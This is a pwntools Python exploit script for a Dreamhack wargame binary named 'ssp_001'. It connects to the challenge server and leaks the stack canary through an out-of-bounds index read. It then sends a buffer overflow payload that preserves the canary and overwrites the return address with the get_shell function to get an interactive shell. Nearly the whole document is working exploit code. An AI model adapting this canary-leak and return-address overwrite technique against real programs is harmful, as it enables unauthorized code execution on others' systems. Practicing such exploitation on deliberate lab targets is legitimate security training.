# python3

from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

context.arch = 'i386'

e = ELF('./ssp_001')

p = remote('host3.dreamhack.games', 11321)

# Get canary
cnry =b''

print(p.recvuntil(b'> '))
p.sendline(b'F')
print(p.recvuntil(b'input : '))
p.sendline(b'A' * 64)


for i in range(131, 127, -1):
    print(p.recvuntil(b'> '))
    p.sendline(b'P')
    print(p.recvuntil(b'index : '))
    p.sendline(f'{i}'.encode())
    print(p.recvuntil(b'is : '))
    cnry += p.recvn(2)
    

print(cnry)
#test = b'0x' + b''.join(cnry_list)
#test_16 = int(test, 16)
#print(f"cnry is : {int(test,16)}, length is {len(test)}, type is {type(test)}")
canary = p32(int(cnry, 16))
#canary = ''.join([x.decode() for x in cnry_list])

print(f"int(cnry, 16): {int(cnry, 16)}, p32(cnry) : {canary},  u32() : {u32(canary)}")

slog("Canary is ", u32(canary))

# Exploit
#get_shell = int(0x080486b9)
get_shell = e.symbols['get_shell']
payload = b'A' * 0x40 + canary + b'B' * 4 + b'C' * 4 + p32(get_shell)

print(f"payload : {payload}")

print(p.recvuntil(b'> '))
p.sendline(b'E')
print(p.recvuntil(b'Size : '))
p.sendline(b'100')
print(p.recvuntil(b'Name : '))
p.sendline(payload)

#p.sendline(b'ls')
p.interactive()




